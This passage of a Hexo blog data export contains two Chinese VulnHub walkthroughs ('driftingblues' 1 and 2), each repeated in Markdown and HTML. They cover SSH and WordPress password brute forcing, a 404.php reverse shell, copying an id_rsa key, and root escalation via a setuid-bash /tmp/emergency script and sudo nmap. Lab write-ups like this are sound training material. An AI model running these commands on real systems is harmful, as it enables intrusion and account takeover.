2>/dev/null\n```\n\n看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方\n\n在备份目录下有个backup.sh，看一下内容\n\n![](https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png)\n\n有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权\n\n思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了\n\n```\necho 'cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot' > /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n```\n\n![](https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png)\n\n![](https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png)\n\n现在可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n> 参考：\n>\n> https://blog.csdn.net/weixin_45922278/article/details/115277255\n","source":"_posts/driftingblues-VulnHub-Walkthrough.md","raw":"---\ntitle: driftingblues VulnHub Walkthrough\ndate: 2021-10-12 16:24:52\ncategories:\n- 渗透测试\ntags:\n- VulnHub\n---\n\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png)\n\n只开放了22和80端口，只能先访问80端口看一下有没有什么信息\n\n![](https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png)\n\n好像没什么东西，扫了目录也没什么信息\n\n![](https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png)\n\n右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径\n\n![](https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png)\n\n访问一下，这个很明显了，到在线的ook!解密网站解密一下\n\n![](https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png)\n\n是一个提示，应该是要修改host文件\n\n![](https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png)\n\n在主页上可以看到一个域名，尝试添加到host再访问\n\n![](https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png)\n\n![](https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png)\n\n重新扫目录还是没有发现，那就试试爆破子域名\n\n```\nwfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H \"Host:FUZZ.driftingblues.box\" --hw 570\n```\n\n![](https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png)\n\n直接访问解析不了，需要再修改一下host\n\n![](https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png)\n\n访问一下\n\n![](https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png)\n\n再扫一次目录，发现有robots.txt\n\n![](https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png)\n\n访问一下，看到给了一些路径\n\n![](https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png)\n\n查看ssh_cred.txt，给了提示\n\n![](https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png)\n\n### 漏洞利用\n\nssh登录的密码是`1mw4ckyyucky*`，目前还缺一位数字，一共十个可能的密码，先生成一下\n\n```\ncrunch 13 13 -t 1mw4ckyyucky% > pass\n```\n\n看一下我们生成的密码集合\n\n![](https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png)\n\n接下来尝试爆破ssh登录密码，根据前面访问`test.driftingblues.box`的提示，用户名应该是`eric`\n\n```\nhydra -l eric -P pass ssh://192.168.62.172\n```\n\n![](https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png)\n\n找到密码了，直接登录ssh\n\n![](https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png)\n\n直接获取第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n### 提权\n\n```\nuname -a\nfind / -perm -u=s -type f 2>/dev/null\ngetcap -r  / 2>/dev/null\n```\n\n看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方\n\n在备份目录下有个backup.sh，看一下内容\n\n![](https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png)\n\n有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权\n\n思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了\n\n```\necho 'cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot' > /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n```\n\n![](https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png)\n\n![](https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png)\n\n现在可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n> 参考：\n>\n> https://blog.csdn.net/weixin_45922278/article/details/115277255\n","slug":"driftingblues-VulnHub-Walkthrough","published":1,"updated":"2021-12-25T12:19:50.096Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyi000lwku12n2vca1m","content":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png\"></p>\n<p>只开放了22和80端口，只能先访问80端口看一下有没有什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png\"></p>\n<p>好像没什么东西，扫了目录也没什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png\"></p>\n<p>右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png\"></p>\n<p>访问一下，这个很明显了，到在线的ook!解密网站解密一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png\"></p>\n<p>是一个提示，应该是要修改host文件</p>\n<p><img src=\"https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png\"></p>\n<p>在主页上可以看到一个域名，尝试添加到host再访问</p>\n<p><img src=\"https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png\"></p>\n<p>重新扫目录还是没有发现，那就试试爆破子域名</p>\n<pre><code>wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H &quot;Host:FUZZ.driftingblues.box&quot; --hw 570\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png\"></p>\n<p>直接访问解析不了，需要再修改一下host</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png\"></p>\n<p>访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png\"></p>\n<p>再扫一次目录，发现有robots.txt</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png\"></p>\n<p>访问一下，看到给了一些路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png\"></p>\n<p>查看ssh_cred.txt，给了提示</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>ssh登录的密码是<code>1mw4ckyyucky*</code>，目前还缺一位数字，一共十个可能的密码，先生成一下</p>\n<pre><code>crunch 13 13 -t 1mw4ckyyucky% &gt; pass\n</code></pre>\n<p>看一下我们生成的密码集合</p>\n<p><img src=\"https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png\"></p>\n<p>接下来尝试爆破ssh登录密码，根据前面访问<code>test.driftingblues.box</code>的提示，用户名应该是<code>eric</code></p>\n<pre><code>hydra -l eric -P pass ssh://192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png\"></p>\n<p>找到密码了，直接登录ssh</p>\n<p><img src=\"https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png\"></p>\n<p>直接获取第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><pre><code>uname -a\nfind / -perm -u=s -type f 2&gt;/dev/null\ngetcap -r  / 2&gt;/dev/null\n</code></pre>\n<p>看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方</p>\n<p>在备份目录下有个backup.sh，看一下内容</p>\n<p><img src=\"https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png\"></p>\n<p>有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权</p>\n<p>思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了</p>\n<pre><code>echo &#39;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#39; &gt; /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png\"></p>\n<p>现在可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/weixin_45922278/article/details/115277255\">https://blog.csdn.net/weixin_45922278/article/details/115277255</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/OmNE8evaC2VQzZc.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/9LTWKF2Irw3bBn4.png\"></p>\n<p>只开放了22和80端口，只能先访问80端口看一下有没有什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/3aTXBh7Au61snxe.png\"></p>\n<p>好像没什么东西，扫了目录也没什么信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/89FHODkPsiIKq3A.png\"></p>\n<p>右键查看源码，看到了一串疑似base64编码的字符串，到在线网站上转换一下，这应该是一个路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/F4z37IMB6HRTbN8.png\"></p>\n<p>访问一下，这个很明显了，到在线的ook!解密网站解密一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/f3Y5qmlHkdy4UO2.png\"></p>\n<p>是一个提示，应该是要修改host文件</p>\n<p><img src=\"https://i.loli.net/2021/10/12/2A8K7SIUoW3ZYCJ.png\"></p>\n<p>在主页上可以看到一个域名，尝试添加到host再访问</p>\n<p><img src=\"https://i.loli.net/2021/10/12/yrY1VEOUn7ZNJuf.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/m8XTnM4pqJRSxYI.png\"></p>\n<p>重新扫目录还是没有发现，那就试试爆破子域名</p>\n<pre><code>wfuzz -u driftingblues.box -w /home/colin/文档/fuzzDicts/subdomainDicts/main.txt -H &quot;Host:FUZZ.driftingblues.box&quot; --hw 570\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/IhLMdEA75BqWY8J.png\"></p>\n<p>直接访问解析不了，需要再修改一下host</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9HeMXPp4nxUc5T3.png\"></p>\n<p>访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/rQZJMdo6itON41X.png\"></p>\n<p>再扫一次目录，发现有robots.txt</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h8NRS47k5FwcyQP.png\"></p>\n<p>访问一下，看到给了一些路径</p>\n<p><img src=\"https://i.loli.net/2021/10/12/hqH8zidLMpy2B4b.png\"></p>\n<p>查看ssh_cred.txt，给了提示</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lO2CwcisZyFhX7Q.png\"></p>\n<h3 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h3><p>ssh登录的密码是<code>1mw4ckyyucky*</code>，目前还缺一位数字，一共十个可能的密码，先生成一下</p>\n<pre><code>crunch 13 13 -t 1mw4ckyyucky% &gt; pass\n</code></pre>\n<p>看一下我们生成的密码集合</p>\n<p><img src=\"https://i.loli.net/2021/10/12/LKM18PeBjnQ3EmN.png\"></p>\n<p>接下来尝试爆破ssh登录密码，根据前面访问<code>test.driftingblues.box</code>的提示，用户名应该是<code>eric</code></p>\n<pre><code>hydra -l eric -P pass ssh://192.168.62.172\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DEn1wX8sbvx3KPy.png\"></p>\n<p>找到密码了，直接登录ssh</p>\n<p><img src=\"https://i.loli.net/2021/10/12/tR6dFViCTaYM3gk.png\"></p>\n<p>直接获取第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/R6CWvfVqErO29Az.png\" style=\"zoom:67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><pre><code>uname -a\nfind / -perm -u=s -type f 2&gt;/dev/null\ngetcap -r  / 2&gt;/dev/null\n</code></pre>\n<p>看了一遍都没有什么发现，只能看一看有没有什么其他可以利用的地方</p>\n<p>在备份目录下有个backup.sh，看一下内容</p>\n<p><img src=\"https://i.loli.net/2021/10/12/y8jaFm2eGTYUiXo.png\"></p>\n<p>有一个sudo执行的/tmp/emergency，但是tmp目录下是没有这个文件的，所以应该通过新建文件来提权</p>\n<p>思路是这样，但还是不知道怎么操作，只能看看别人的walkthrough了</p>\n<pre><code>echo &#39;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#39; &gt; /tmp/emergency\n#系统执行backup.up，以sudo执行emergency，会将/bin/bash复制到tmp，并赋予执行权限\nchmod +x emergency\n./getroot -p\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/jWGusDP8aTNwCgS.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/lRnyG9txiQKuYW5.png\"></p>\n<p>现在可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/bWHGwDhZx1cTntf.png\" style=\"zoom:67%;\" />\n\n<blockquote>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/weixin_45922278/article/details/115277255\">https://blog.csdn.net/weixin_45922278/article/details/115277255</a></p>\n</blockquote>\n"},{"title":"driftingblues2 VulnHub Walkthrough","date":"2021-10-12T08:31:08.000Z","_content":"\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.171\n```\n\n![](https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png)\n\n开放端口：21(ftp)、22(ssh)、80(http)\n\n可以匿名访问ftp服务，有一张图片，应该有隐藏的信息\n\n![](https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png)\n\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n图片先放着，访问80端口没什么东西，扫一下目录\n\n```\ndirsearch -u http://192.168.62.171/\n```\n\n![](https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png)\n\n有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下\n\n![](https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png)\n\n![](https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png)\n\n用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名\n\n```\nwpscan --url http://driftingblues.box/blog/ -e u\n```\n\n![](https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png)\n\n再通过获取到的用户名albert，试试爆破密码\n\n```\nwpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n```\n\n![](https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png)\n\n稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码`albert:scotland1`登录后台\n\n![](https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png)\n\n### Get Shell\n\n通过修改主题的404.php来反弹shell\n\n![](https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png)\n\n修改后先开启一个监听端口来接受shell\n\n![](https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png)\n\n访问404.php成功反弹shell\n\n![](https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png)\n\n![](https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png)\n\n靶机有python环境，可以获取一个交互式的shell\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n\n![](https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png)\n\n进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录\n\n![](https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png)\n\n```\nssh freddie@192.168.62.171 -i id_rsa\n```\n\n![](https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png)\n\n得到第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n### 提权\n\n![](https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png)\n\n可以看出来，接下来需要用nmap提权\n\n```\necho \"os.execute('/bin/sh')\" > shell.nse && sudo nmap --script=shell.nse\n```\n\n![](https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png)\n\n执行完获得root权限，但此时是看不到输入的，接着执行\n\n```\nreset\n```\n\n这时就可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n所以，一开始获取的图片还是没用上\n\n","source":"_posts/driftingblues2-VulnHub-Walkthrough.md","raw":"---\ntitle: driftingblues2 VulnHub Walkthrough\ndate: 2021-10-12 16:31:08\ncategories:\n- 渗透测试\ntags:\n- VulnHub\n---\n\n### 信息收集\n\n#### 主机探测\n\n```\narp-scan -l\n```\n\n![](https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png)\n\n#### 端口扫描\n\n```\nnmap -sC -sV -p- 192.168.62.171\n```\n\n![](https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png)\n\n开放端口：21(ftp)、22(ssh)、80(http)\n\n可以匿名访问ftp服务，有一张图片，应该有隐藏的信息\n\n![](https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png)\n\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n图片先放着，访问80端口没什么东西，扫一下目录\n\n```\ndirsearch -u http://192.168.62.171/\n```\n\n![](https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png)\n\n有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下\n\n![](https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png)\n\n![](https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png)\n\n用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名\n\n```\nwpscan --url http://driftingblues.box/blog/ -e u\n```\n\n![](https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png)\n\n再通过获取到的用户名albert，试试爆破密码\n\n```\nwpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n```\n\n![](https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png)\n\n稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码`albert:scotland1`登录后台\n\n![](https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png)\n\n### Get Shell\n\n通过修改主题的404.php来反弹shell\n\n![](https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png)\n\n修改后先开启一个监听端口来接受shell\n\n![](https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png)\n\n访问404.php成功反弹shell\n\n![](https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png)\n\n![](https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png)\n\n靶机有python环境，可以获取一个交互式的shell\n\n```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n\n![](https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png)\n\n进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录\n\n![](https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png)\n\n```\nssh freddie@192.168.62.171 -i id_rsa\n```\n\n![](https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png)\n\n得到第一个flag\n\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n### 提权\n\n![](https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png)\n\n可以看出来，接下来需要用nmap提权\n\n```\necho \"os.execute('/bin/sh')\" > shell.nse && sudo nmap --script=shell.nse\n```\n\n![](https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png)\n\n执行完获得root权限，但此时是看不到输入的，接着执行\n\n```\nreset\n```\n\n这时就可以获取第二个flag了\n\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n所以，一开始获取的图片还是没用上\n\n","slug":"driftingblues2-VulnHub-Walkthrough","published":1,"updated":"2021-12-25T12:19:50.096Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2nyj000qwku1asi1hsv4","content":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.171\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png\"></p>\n<p>开放端口：21(ftp)、22(ssh)、80(http)</p>\n<p>可以匿名访问ftp服务，有一张图片，应该有隐藏的信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png\"></p>\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n<p>图片先放着，访问80端口没什么东西，扫一下目录</p>\n<pre><code>dirsearch -u http://192.168.62.171/\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png\"></p>\n<p>有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png\"></p>\n<p>用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -e u\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png\"></p>\n<p>再通过获取到的用户名albert，试试爆破密码</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png\"></p>\n<p>稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码<code>albert:scotland1</code>登录后台</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png\"></p>\n<h3 id=\"Get-Shell\"><a href=\"#Get-Shell\" class=\"headerlink\" title=\"Get Shell\"></a>Get Shell</h3><p>通过修改主题的404.php来反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/9ONakjD2EB6ny4u.png\"></p>\n<p>修改后先开启一个监听端口来接受shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/a8W6ZkJjGcMBlpF.png\"></p>\n<p>访问404.php成功反弹shell</p>\n<p><img src=\"https://i.loli.net/2021/10/12/lDcPjpYvOqwobHB.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/7DuRciGkKm6JsyT.png\"></p>\n<p>靶机有python环境，可以获取一个交互式的shell</p>\n<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/HuvbSQOLFjsTfZp.png\"></p>\n<p>进入到freddie的家目录，有ssh的key，我们将id_rsa下载到本地，进行免密登录</p>\n<p><img src=\"https://i.loli.net/2021/10/12/WAjV4Iuz61xQXi5.png\"></p>\n<pre><code>ssh freddie@192.168.62.171 -i id_rsa\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/43WwvJiHIplaFgf.png\"></p>\n<p>得到第一个flag</p>\n<img src=\"https://i.loli.net/2021/10/12/1taln9PfMDVAb3v.png\" style=\"zoom: 67%;\" />\n\n<h3 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h3><p><img src=\"https://i.loli.net/2021/10/12/A9zQxtDdcq8kEjp.png\"></p>\n<p>可以看出来，接下来需要用nmap提权</p>\n<pre><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/yVPcajOXnBzpASK.png\"></p>\n<p>执行完获得root权限，但此时是看不到输入的，接着执行</p>\n<pre><code>reset\n</code></pre>\n<p>这时就可以获取第二个flag了</p>\n<img src=\"https://i.loli.net/2021/10/12/b5u36MeOmTI7w41.png\" style=\"zoom:67%;\" />\n\n<p>所以，一开始获取的图片还是没用上</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><h4 id=\"主机探测\"><a href=\"#主机探测\" class=\"headerlink\" title=\"主机探测\"></a>主机探测</h4><pre><code>arp-scan -l\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/DINClwUz2k5udbh.png\"></p>\n<h4 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h4><pre><code>nmap -sC -sV -p- 192.168.62.171\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/VsW7DF1kaZpogI2.png\"></p>\n<p>开放端口：21(ftp)、22(ssh)、80(http)</p>\n<p>可以匿名访问ftp服务，有一张图片，应该有隐藏的信息</p>\n<p><img src=\"https://i.loli.net/2021/10/12/pk4b8jfBOyKsQSg.png\"></p>\n<img src=\"https://i.loli.net/2021/10/12/dEbtcZYKkvzCOBG.jpg\" style=\"zoom: 25%;\" />\n\n<p>图片先放着，访问80端口没什么东西，扫一下目录</p>\n<pre><code>dirsearch -u http://192.168.62.171/\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/orNt14jPdbzLQYT.png\"></p>\n<p>有个blog的路径，是wordpress搭建的，修改一下host文件再访问一下</p>\n<p><img src=\"https://i.loli.net/2021/10/12/EPg4VSAOrdJUueH.png\"></p>\n<p><img src=\"https://i.loli.net/2021/10/12/Em8lMOsAgatJIwj.png\"></p>\n<p>用wpscan简单扫描没有发现有用信息，那就枚举一下出用户名</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -e u\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/xW2hE8bMkJrjP9O.png\"></p>\n<p>再通过获取到的用户名albert，试试爆破密码</p>\n<pre><code>wpscan --url http://driftingblues.box/blog/ -U albert -P /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img src=\"https://i.loli.net/2021/10/12/6jwKtnJf4hSdF9o.png\"></p>\n<p>稍微等了一会就成功爆破出来了密码，那就用获取到的账号密码<code>albert:scotland1</code>登录后台</p>\n<p><img src=\"https://i.loli.net/2021/10/12/h6NLpYQCBe82ds3.png\"></p>\n<h3 id=\"Get-Shell\"><a href=\"#Get-Shell\" class=\"headerlink\" title=\"Get 